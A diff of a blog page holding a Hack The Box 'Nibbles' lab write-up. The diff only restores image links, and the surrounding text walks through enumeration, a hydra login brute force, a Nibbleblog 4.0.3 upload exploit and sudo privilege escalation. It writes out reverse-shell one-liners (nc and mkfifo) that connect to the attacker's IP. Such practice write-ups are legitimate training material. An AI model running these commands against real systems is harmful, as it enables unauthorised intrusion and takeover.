@@ -211,58 +211,38 @@
       <h1 class="post-title">Nibbles - Hack the box</h1>
       <p class="post-meta">@Neal · Mar 17, 2019 · 18 min read</p>
     </header>
-    <article class="post-content"><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+    <article class="post-content"><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/47a5f56710b4.png" alt="Ae0G8g.png"></p>
 <h2 id="introduction">Introduction</h2>
 <p>Target: 10.10.10.75(OS: Linux)
 Kali linux: 10.10.16.44</p>
 <h2 id="information-enumeration">Information Enumeration</h2>
 <p>Firstly, detect the open ports:</p>
 <pre tabindex="0"><code>nmap -sT -p- --min-rate 10000 -oA openports 10.10.10.75
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/cc64bb41eafd.png" alt="Ae19BQ.png"></p>
 <p>There are not too many open ports, just <code>80</code> and <code>22</code>. Detect the detailed services of the open ports:</p>
 <pre tabindex="0"><code>nmap -sC -sV -oA services 10.10.10.75
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/ebe33e24e983.png" alt="Ae1E90.png"></p>
 <p>Nothing special found. The only clue may be the open port of <code>80</code>. To be honest, the box with less open ports is easier in general.</p>
 <h2 id="exploit">Exploit</h2>
 <h3 id="http">Http</h3>
 <p>Access to <code>http://10.10.10.75</code>, just a web page of <code>hello world</code>.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5b9c2d80261d.png" alt="Ae0qsA.png"></p>
 <p>With the first sight, have not found anything special. Open the inspector, a comment can be found. Obviously, <code>nibbleblog</code> is quite important to us. Access to <code>http://10.10.10.75/nibbleblog</code>:</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f945c2e25684.png" alt="Ae0XZt.png"></p>
 <p>It seems to be a blog demo. Try to access to each hyperlink in the web page, find nothing special. Try to use nikto to explore:</p>
 <pre tabindex="0"><code>nikto -host http://10.10.10.75/nibbleblog/
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/f30066345eb7.png" alt="AeYklt.png"></p>
 <p><code>[nibbleblog](http://www.nibbleblog.com/)</code>  is an open source blog system which has been widely used. From the above screenshot, some interesting links can be found. And also try to brute force with <code>gobuster</code>:</p>
 <pre tabindex="0"><code>gobuster -u http://10.10.10.75/nibbleblog/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
 </code></pre><p>Similarly, the directory of <code>nibbleblog</code> can be found, just like admin, content, etc. Open the README of the blog:</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5f4d55418172.png" alt="AeYynK.png"></p>
 <p>The version is <code>4.0.3</code>. Google with <code>nibbleblog 4.0.3 exploit</code>. Find a <a href="https://curesec.com/blog/article/blog/NibbleBlog-403-Code-Execution-47.html">report</a> to talk about the exploit of nibbleblog of <code>4.0.3</code>.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/02391d3eb4dd.png" alt="AeYRtH.png"></p>
 <p>The research report is detailed. But there is a precondition that you have to obtain admin credentials. Access to login page: <code>http://10.10.10.75/nibbleblog/admin.php</code>.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/a6399ea1bb93.png" alt="AeY5ct.png"></p>
 <p>Try the password of <code>123456</code> and <code>admin</code>. Both are not correct. I have even tried to use hydra:</p>
 <p><code>hydra -l admin -P /usr/share/wordlist/rockyou.txt -vV -f -t 2 10.10.10.75 http-post-form &quot;/nibbleblog/admin.php:username=^USER^&amp;password=^PASS^:login_error&quot;</code></p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/999a82a4ffe9.png" alt="AetpuV.png"></p>
 <p>The hydra result shows that the password is <code>123456</code>. But it is not correct. I doubt it has something with the blacklist of <code>nibbleblog</code>. Whatever, try to figure out the password. Try <code>nibbles</code>. Wow, we are in. You should try every password as more as possible.</p>
 <p>As you have logged in. The above report can be used:</p>
 <ol>
@@ -417,23 +397,15 @@ Kali linux: 10.10.16.44</p>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010"> 
 </span></span></span></code></pre></div><p>Accomplish the last step, get the user shell!</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/5380baf38eed.png" alt="AetbKx.png"></p>
 <h2 id="privilege-escalation">Privilege escalation</h2>
 <p>The next step is to get the root shell. Try to check the kernel of the linux:</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/6fbf828a7774.png" alt="AeNAZ8.png"></p>
 <p>The kernel seems quite fresh. It may be hard to find the kernel exploit. Try to check the sudo permission of nibbler: <code>sudo -l</code>.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/abc6756263e3.png" alt="AeNuzn.png"></p>
 <p>Just as expected, find a file <code>monitor.sh</code> with root permission. Try to read the file with:</p>
 <pre tabindex="0"><code>cat /home/nibbler/personal/stuff/monitor.sh
-</code></pre><blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+</code></pre><p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/e31074d67b3b.png" alt="AeNrdO.png"></p>
 <p>The file seems to be a bash script with several tasks. There is no need to understand the usage of the file. We can just modify the script to obtain root shell. So the script should be modified. As it is not convenient to modify the file in the victim machine directly. <code>Nc</code> can be used to send and receive file.</p>
 <p>As the sender:</p>
 <pre tabindex="0"><code>nc -w 3 10.10.16.44 1234 &lt; monitor.sh
@@ -443,9 +415,7 @@ Kali linux: 10.10.16.44</p>
 <p>Firstly, <code>nc</code> is used to reverse shell:</p>
 <pre tabindex="0"><code>nc -e 10.10.16.44 1111
 </code></pre><p>Try to set <code>nc</code> listen to <code>1111</code>:</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/d8b6d9829d09.png" alt="AeUA61.png"></p>
 <p>There&rsquo;s a problem with the <code>nc</code> in the victim machine. <code>e</code> option is invalid in the victim machine. May there are some solutions, but I turn to other reverse shell methods right away.</p>
 <pre tabindex="0"><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.16.44 1234 &gt;/tmp/f
 </code></pre><p>Send the <code>monitor.sh</code> to the victim machine and make sure to obtain the execution permission:</p>
@@ -453,9 +423,7 @@ Kali linux: 10.10.16.44</p>
 </code></pre><p>Establish the listen to <code>1234</code> in Kali linux and execute the <code>monitor.sh</code> in the victim machine:</p>
 <pre tabindex="0"><code>sudo ./monitor.sh
 </code></pre><p>Here is the root.</p>
-<blockquote>
-<p><strong>（原外链配图已失效移除，请以正文说明为准）</strong></p>
-</blockquote>
+<p><img src="https://cdn.jsdelivr.net/gh/madneal/blog-image@main/images/recovered/00db624c19dd.png" alt="AeaECQ.png"></p>
 <h2 id="conclusion">Conclusion</h2>
 <p>To be honest, the most difficult challenge of this box is to guess the password of admin of <code>nibbleblog</code>. The known vulnerability is not difficult to utilize. To obtain root shell, there are some methods to try. Some specific method cannot be utilized directly. You can try another method. Try harder!</p>
 <h2 id="练习收获清单">练习收获清单</h2>
